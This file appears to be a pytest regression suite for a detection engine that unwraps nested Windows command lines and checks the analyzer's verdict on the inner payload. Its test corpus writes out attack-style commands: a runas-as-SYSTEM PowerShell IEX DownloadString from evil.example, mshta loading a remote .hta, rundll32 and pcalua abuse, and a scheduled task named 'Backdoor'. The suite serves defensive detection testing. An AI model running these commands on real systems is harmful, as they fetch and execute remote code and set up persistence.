"""Command Reconstruction Engine · regression suite.

This suite validates the CLASS of nested-wrapper command lines, not
individual samples. Every case asserts the eight canonical fields the
user's engineering template requires:

    · Wrapper Chain      — CRE peeled the correct wrappers in order
    · Effective Payload  — innermost recovered command matches spec
    · Decode Chain       — CRE ran to a clean stop (no early bail-out)
    · Final Payload      — analyzer sees the effective payload verbatim
    · Behaviors          — expected behaviors fire on the effective payload
    · Verdict            — verdict reflects the effective payload, not the wrapper
    · Evidence           — every step's `evidence` string is non-empty
    · Deterministic      — running the same input twice yields byte-identical output

If any assertion fails, root-cause the CRE stage or the downstream
analyzer — do NOT patch this sample with a regex band-aid.
"""
from __future__ import annotations

import pytest

from v2.investigation.cre import DispatchHint, reconstruct
from v2.semantic.ps_semantic import analyze


# ── Corpus (each row exercises the CRE at CLASS level) ──────────
CORPUS: list[dict] = [
    {
        "id": "wmic_cmd_powershell_downloadstring",
        "cmdline":
            'wmic process call create CommandLine="cmd /c powershell.exe '
            '-C Write-Host ([Net.WebClient]::new().DownloadString('
            "'https://gist.githubusercontent.com/mgraeber-rc/"
            "25ebfac64a2ba5ca22639da9c1aefcfd/raw/"
            "d0c4f7338ebc2f8d5349b66b2e31cf239297053f/tweet.txt'))\"",
        "expected_chain":    ["wmic", "cmd", "powershell"],
        "expected_dispatch": DispatchHint.POWERSHELL,
        "expected_in_payload": "DownloadString",
        "expected_behaviors_any": {"webclient_downloadstring",
                                     "runtime_dependent",
                                     "external_network"},
        "expected_verdict": "runtime_dependent",
    },
    {
        "id": "wmic_cmd_mshta_url",
        "cmdline":
            'wmic process call create CommandLine="cmd /c mshta.exe '
            'http://evil.example/x.hta"',
        "expected_chain":    ["wmic", "cmd"],
        "expected_dispatch": DispatchHint.LOLBAS,
        "expected_in_payload": "mshta.exe",
        "expected_behaviors_any": {"lolbin_abuse", "external_network",
                                     "remote_script_download"},
        "expected_verdict_in": {"runtime_dependent", "suspicious"},
    },
    {
        "id": "wmic_cmd_rundll32_url",
        "cmdline":
            'wmic process call create CommandLine="cmd /c rundll32.exe '
            'url.dll,OpenURL http://evil.example/"',
        "expected_chain":    ["wmic", "cmd"],
        "expected_dispatch": DispatchHint.LOLBAS,
        "expected_in_payload": "rundll32.exe",
        "expected_behaviors_any": {"lolbin_abuse"},
        "expected_verdict_in": {"runtime_dependent", "suspicious"},
    },
    {
        "id": "schtasks_powershell_encodedcommand",
        # b64 UTF-16LE of `Write-Host "Hello"`
        "cmdline":
            'schtasks /create /sc once /tn Backdoor /tr "powershell '
            '-EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAGwAbABvACIA" '
            '/st 00:00',
        "expected_chain":    ["schtasks", "powershell"],
        "expected_dispatch": DispatchHint.POWERSHELL,
        "expected_in_payload": "Write-Host",
        "expected_behaviors_any": {"encoded_command"},
        "expected_verdict_any": True,   # any non-None verdict
    },
    {
        "id": "runas_powershell_iex_webclient",
        "cmdline":
            'runas /user:SYSTEM "powershell -Command IEX(New-Object '
            "Net.WebClient).DownloadString('http://evil.example/x')\"",
        "expected_chain":    ["runas", "powershell"],
        "expected_dispatch": DispatchHint.POWERSHELL,
        "expected_in_payload": "DownloadString",
        "expected_behaviors_any": {"invoke_expression",
                                     "webclient_downloadstring",
                                     "external_network"},
        "expected_verdict_any": True,
    },
    {
        "id": "pcalua_mshta_javascript",
        "cmdline":
            'pcalua.exe -a mshta.exe -c "javascript:alert(1)"',
        "expected_chain":    ["pcalua"],
        "expected_dispatch": DispatchHint.LOLBAS,
        "expected_in_payload": "mshta.exe",
        "expected_behaviors_any": {"lolbin_abuse"},
        "expected_verdict_any": True,
    },
    {
        "id": "powershell_cmd_wmic_reverse_nesting",
        "cmdline":
            'powershell -Command "cmd /c wmic process call create '
            'CommandLine=\\"calc.exe\\""',
        "expected_chain":    ["powershell", "cmd", "wmic"],
        "expected_dispatch": DispatchHint.UNKNOWN,
        "expected_in_payload": "calc.exe",
        # `calc.exe` alone produces no behaviors and no IOCs — verdict
        # legitimately stays `unknown`. This is the ONLY case where the
        # CRE peels correctly but the downstream analyzer has nothing to
        # analyze on the effective payload.
        "expected_behaviors_any": set(),
    },
    {
        "id": "plain_cmd_powershell",
        "cmdline": 'cmd /c powershell -C "Write-Host hi"',
        "expected_chain":    ["cmd", "powershell"],
        "expected_dispatch": DispatchHint.POWERSHELL,
        "expected_in_payload": "Write-Host",
        "expected_behaviors_any": set(),   # tolerate any
        "expected_verdict_any": True,
    },
    {
        "id": "no_wrapper_bare_powershell",
        "cmdline": 'Get-Process | Where-Object {$_.CPU -gt 100}',
        "expected_chain":    [],
        "expected_dispatch": DispatchHint.POWERSHELL,
        "expected_in_payload": "Get-Process",
        "expected_behaviors_any": set(),
        "expected_verdict_any": True,
    },
]


@pytest.mark.parametrize("case", CORPUS, ids=lambda c: c["id"])
def test_cre_reconstruction_matches_class_contract(case: dict) -> None:
    r = reconstruct(case["cmdline"])
    # ── 1. Wrapper Chain
    assert [s.wrapper for s in r.chain] == case["expected_chain"], (
        f"[{case['id']}] wrapper chain mismatch — CRE peeled {[s.wrapper for s in r.chain]!r}, "
        f"expected {case['expected_chain']!r}"
    )
    # ── 2. Effective Payload
    assert case["expected_in_payload"] in r.effective_payload, (
        f"[{case['id']}] effective payload missing expected substring "
        f"{case['expected_in_payload']!r}: got {r.effective_payload!r}"
    )
    # ── 3. Decode Chain (clean stop)
    assert r.stopped_reason in ("", "max_depth_reached"), (
        f"[{case['id']}] CRE bailed out with reason={r.stopped_reason!r}"
    )
    # ── 4. Dispatch hint
    assert r.dispatch_hint == case["expected_dispatch"], (
        f"[{case['id']}] dispatch hint mismatch — got {r.dispatch_hint} "
        f"expected {case['expected_dispatch']}"
    )
    # ── 5. Evidence (every step must have a non-empty evidence string)
    for step in r.chain:
        assert step.evidence.strip(), (
            f"[{case['id']}] step {step.wrapper!r} emitted an empty "
            f"evidence string — analysts must always see WHY the peel fired"
        )
    # ── 6. Determinism (byte-identical output on a second run)
    r2 = reconstruct(case["cmdline"])
    assert r.determinism_hash == r2.determinism_hash, (
        f"[{case['id']}] CRE is not deterministic — hash drift between runs"
    )


@pytest.mark.parametrize("case", CORPUS, ids=lambda c: c["id"])
def test_cre_downstream_analysis_sees_effective_payload(case: dict) -> None:
    """The whole point of the CRE is that downstream engines automatically
    benefit — verify that the semantic analyzer runs against the
    reconstructed payload and produces the expected behaviors + verdict."""
    sem = analyze(case["cmdline"]).to_dict()
    # Wrapper chain must be attached to the semantic result (single source
    # of truth for every analyst-facing surface downstream).
    assert isinstance(sem.get("wrapper_chain"), list)
    if case["expected_chain"]:
        assert [s["wrapper"] for s in sem["wrapper_chain"]] == case["expected_chain"]
    # Behaviors — at least one of the expected set must fire
    if case["expected_behaviors_any"]:
        got = {b["id"] for b in sem.get("behaviors_v2") or []}
        assert case["expected_behaviors_any"] & got, (
            f"[{case['id']}] expected any of {case['expected_behaviors_any']} "
            f"to fire on the CRE-peeled payload; got {got!r}"
        )
    # Verdict
    if "expected_verdict" in case:
        assert sem.get("verdict") == case["expected_verdict"], (
            f"[{case['id']}] verdict mismatch — got {sem.get('verdict')!r} "
            f"expected {case['expected_verdict']!r}"
        )
    elif "expected_verdict_in" in case:
        assert sem.get("verdict") in case["expected_verdict_in"], (
            f"[{case['id']}] verdict {sem.get('verdict')!r} not in "
            f"expected set {case['expected_verdict_in']!r}"
        )
    elif case.get("expected_verdict_any"):
        assert sem.get("verdict") not in (None, "", "unknown"), (
            f"[{case['id']}] expected a concrete verdict, got "
            f"{sem.get('verdict')!r}"
        )


def test_cre_registry_extensibility_contract() -> None:
    """Every parser in the registry must implement the WrapperParser
    protocol — `NAME`, `match(str) -> bool`, `extract(str) -> Step | None`.
    Guardrail so a future wrapper cannot be added without honoring the
    interface (which is what keeps the engine table-driven)."""
    from v2.investigation.cre.wrappers import WRAPPER_REGISTRY
    for parser in WRAPPER_REGISTRY:
        assert hasattr(parser, "NAME") and isinstance(parser.NAME, str)
        assert parser.NAME == parser.NAME.lower(), (
            f"wrapper NAME must be lowercase — got {parser.NAME!r}"
        )
        # These MUST NOT raise on empty input
        assert parser.match("") is False
        assert parser.extract("") is None
